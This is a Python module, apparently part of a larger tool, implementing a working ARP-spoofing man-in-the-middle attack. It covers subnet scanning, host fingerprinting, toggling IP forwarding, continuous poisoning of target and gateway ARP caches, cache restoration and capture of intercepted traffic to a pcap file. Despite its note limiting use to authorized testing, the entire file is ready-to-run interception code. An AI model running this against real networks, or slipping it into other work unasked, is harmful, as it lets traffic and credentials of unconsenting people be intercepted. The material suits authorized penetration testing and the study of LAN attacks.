"""
ARP spoofing / MITM engine, for authorized security testing only.

Only use this against networks and hosts you are explicitly authorized to
test (your own lab, or an engagement covered by a signed agreement/scope).
ARP spoofing disrupts the normal operation of a network and intercepting
someone else's traffic without authorization is illegal in most countries.

This module only implements the mechanics (poisoning, forwarding, capture).
The interactive confirmation lives in menu.py.
"""
import ipaddress
import json
import os
import socket
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from scapy.all import ARP, ICMP, IP, AsyncSniffer, Ether, conf, get_if_hwaddr, sendp, sr1, srp
from scapy.utils import PcapWriter

OUI_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "oui_vendors.json")
_OUI = None


def is_admin():
    if os.name == "nt":
        import ctypes
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def list_interfaces():
    """Return [(name, description, ip)] for interfaces that have an IPv4 address."""
    out = []
    for iface in conf.ifaces.values():
        ip = getattr(iface, "ip", None)
        if ip and ip != "0.0.0.0":
            out.append((iface.name, getattr(iface, "description", iface.name) or iface.name, ip))
    return out


def default_gateway():
    try:
        gw = conf.route.route("0.0.0.0")[2]
        return gw if gw and gw != "0.0.0.0" else None
    except Exception:
        return None


def mac_for_ip(ip, iface, timeout=2, retries=2):
    """Resolve the MAC address of ip via ARP who-has. None if there is no answer."""
    for _ in range(retries):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), iface=iface, timeout=timeout, verbose=0)
        if ans:
            return ans[0][1].hwsrc
    return None


def scan_subnet(cidr, iface, timeout=3):
    """ARP-scan a subnet. Returns [(ip, mac)], sorted by IP."""
    net = ipaddress.ip_network(cidr, strict=False)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)), iface=iface, timeout=timeout, verbose=0)
    hosts = [(r.psrc, r.hwsrc) for _, r in ans]
    return sorted(hosts, key=lambda h: ipaddress.ip_address(h[0]))


# --------------------------------------------------------- device identification
def vendor_for_mac(mac):
    """Best-effort manufacturer name from the MAC's OUI (first 3 bytes), from a curated
    offline copy of the IEEE registry (consumer/network-device vendors only, see
    build note in oui_vendors.json). Flags locally-administered (randomised/private)
    MACs, common on modern phones/tablets doing Wi-Fi privacy, since their real
    hardware vendor is deliberately hidden."""
    global _OUI
    if not mac:
        return None
    try:
        first_octet = int(mac.split(":")[0], 16)
    except ValueError:
        return None
    if first_octet & 0x02:
        return "Private/randomized address (likely a phone or tablet hiding its real vendor)"
    if _OUI is None:
        try:
            with open(OUI_PATH, encoding="utf-8") as f:
                _OUI = json.load(f)
        except OSError:
            _OUI = {}
    return _OUI.get(mac.upper()[:8])


def hostname_via_dns(ip, timeout=1.0):
    """Reverse-DNS lookup; works if the local router/DNS server knows a name for this IP."""
    old = socket.getdefaulttimeout()
    try:
        socket.setdefaulttimeout(timeout)
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return None
    finally:
        socket.setdefaulttimeout(old)


def hostname_via_netbios(ip, timeout=1.0):
    """Ask the host for its NetBIOS computer name (Windows file/printer sharing).
    Uses the OS's own nbtstat/nmblookup tool instead of a hand-rolled NBNS packet."""
    try:
        if os.name == "nt":
            out = subprocess.run(["nbtstat", "-A", ip], capture_output=True, text=True,
                                  timeout=timeout + 1)
            for line in out.stdout.splitlines():
                parts = line.split()
                if len(parts) >= 3 and parts[1] == "<00>" and parts[2] == "UNIQUE":
                    return parts[0]
        else:
            out = subprocess.run(["nmblookup", "-A", ip], capture_output=True, text=True,
                                  timeout=timeout + 1)
            for line in out.stdout.splitlines():
                line = line.strip()
                if line.endswith("<00>") and "GROUP" not in line:
                    return line.split()[0]
    except Exception:
        pass
    return None


def os_guess(ip, iface, timeout=1.0):
    """Rough OS family guess from the TTL of a single ICMP echo reply (same trick as nmap/p0f)."""
    try:
        reply = sr1(IP(dst=ip) / ICMP(), iface=iface, timeout=timeout, verbose=0)
    except Exception:
        return None
    if reply is None or not reply.haslayer(IP):
        return None
    ttl = reply.ttl
    if ttl <= 64:
        return f"Linux / Android / iOS / macOS (TTL {ttl})"
    if ttl <= 128:
        return f"Windows (TTL {ttl})"
    return f"Network device / other (TTL {ttl})"


def identify_hosts(hosts, iface, timeout=1.0):
    """hosts: [(ip, mac)]. Looks up vendor/hostname/OS guess for each host in parallel
    (vendor is an instant offline lookup; hostname and OS guess send a few harmless,
    read-only packets per host - standard LAN discovery traffic, not an attack)."""
    def _one(item):
        ip, mac = item
        return {"ip": ip, "mac": mac, "vendor": vendor_for_mac(mac),
                "hostname": hostname_via_dns(ip, timeout) or hostname_via_netbios(ip, timeout),
                "os_guess": os_guess(ip, iface, timeout)}
    if not hosts:
        return []
    with ThreadPoolExecutor(max_workers=min(32, len(hosts))) as ex:
        return list(ex.map(_one, hosts))


# --------------------------------------------------------------- forwarding
def forwarding_get():
    """Return the current IP-forwarding state (best effort), to restore it later."""
    if os.name == "nt":
        import winreg
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters") as k:
                val, _ = winreg.QueryValueEx(k, "IPEnableRouter")
                return bool(val)
        except FileNotFoundError:
            return False
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip() == "1"
    except OSError:
        return None


def forwarding_set(enabled):
    """Best effort: enable/disable IP forwarding. Returns a note for the user."""
    if os.name == "nt":
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "IPEnableRouter", 0, winreg.REG_DWORD, 1 if enabled else 0)
        return ("Windows IP forwarding was changed in the registry (IPEnableRouter). "
                "On many Windows versions this only takes effect after a reboot or a "
                "restart of the network adapters - without it, victims will lose internet "
                "access while spoofed.")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1" if enabled else "0")
    return "IP forwarding toggled via sysctl (takes effect immediately)."


# ------------------------------------------------------------------- engine
class ArpSpoofer:
    """
    Poisons the ARP cache of `targets` (and, if bidirectional, the gateway too),
    making traffic between them pass through this host. Always restores the
    real ARP mappings when stopped.
    """

    def __init__(self, iface, gateway_ip, targets, bidirectional=True, interval=2.0):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.targets = list(dict.fromkeys(targets))  # de-dupe, keep order
        self.bidirectional = bidirectional and gateway_ip is not None
        self.interval = interval
        self.my_mac = get_if_hwaddr(iface)
        self.resolved = {}  # ip -> real mac
        self._stop = threading.Event()
        self._thread = None

    def resolve(self):
        ips = set(self.targets)
        if self.gateway_ip:
            ips.add(self.gateway_ip)
        missing = []
        for ip in ips:
            mac = mac_for_ip(ip, self.iface)
            if mac:
                self.resolved[ip] = mac
            else:
                missing.append(ip)
        if missing:
            raise RuntimeError(f"Could not resolve a MAC address for: {', '.join(missing)} "
                               "(host offline, wrong subnet, or blocking ARP)")

    def _poison_once(self):
        # Sent as explicit Ether/ARP frames via sendp() (layer 2): some scapy versions
        # raise "Cannot use iface= with this packet type" when send()ing a bare ARP().
        for t in self.targets:
            if t not in self.resolved:
                continue
            if self.gateway_ip:
                # tell the target "I am the gateway"
                sendp(Ether(src=self.my_mac, dst=self.resolved[t]) /
                      ARP(op=2, pdst=t, hwdst=self.resolved[t], psrc=self.gateway_ip, hwsrc=self.my_mac),
                      iface=self.iface, verbose=0)
            if self.bidirectional:
                # tell the gateway "I am this target"
                sendp(Ether(src=self.my_mac, dst=self.resolved[self.gateway_ip]) /
                      ARP(op=2, pdst=self.gateway_ip, hwdst=self.resolved[self.gateway_ip], psrc=t, hwsrc=self.my_mac),
                      iface=self.iface, verbose=0)

    def _loop(self):
        while not self._stop.is_set():
            try:
                self._poison_once()
            except Exception:
                pass
            self._stop.wait(self.interval)

    def start(self):
        self.resolve()
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def restore(self):
        """Stop poisoning and send a few correct ARP announcements to heal the caches faster."""
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=2)
        for _ in range(3):
            for t in self.targets:
                if t in self.resolved and self.gateway_ip in self.resolved:
                    sendp(Ether(src=self.resolved[self.gateway_ip], dst=self.resolved[t]) /
                          ARP(op=2, pdst=t, hwdst=self.resolved[t], psrc=self.gateway_ip,
                              hwsrc=self.resolved[self.gateway_ip]),
                          iface=self.iface, verbose=0)
                    if self.bidirectional:
                        sendp(Ether(src=self.resolved[t], dst=self.resolved[self.gateway_ip]) /
                              ARP(op=2, pdst=self.gateway_ip, hwdst=self.resolved[self.gateway_ip],
                                  psrc=t, hwsrc=self.resolved[t]),
                              iface=self.iface, verbose=0)
            time.sleep(0.3)


class TrafficCapture:
    """Captures packets to/from the spoofed targets into a pcap file while the attack runs."""

    def __init__(self, iface, targets, path):
        self.path = path
        hosts = " or ".join(f"host {t}" for t in targets)
        self._writer = PcapWriter(path, append=False, sync=True)
        self._sniffer = AsyncSniffer(iface=iface, filter=hosts, prn=self._on_packet, store=False)
        self.count = 0

    def _on_packet(self, pkt):
        self._writer.write(pkt)
        self.count += 1

    def start(self):
        self._sniffer.start()

    def stop(self):
        self._sniffer.stop()
        self._writer.close()
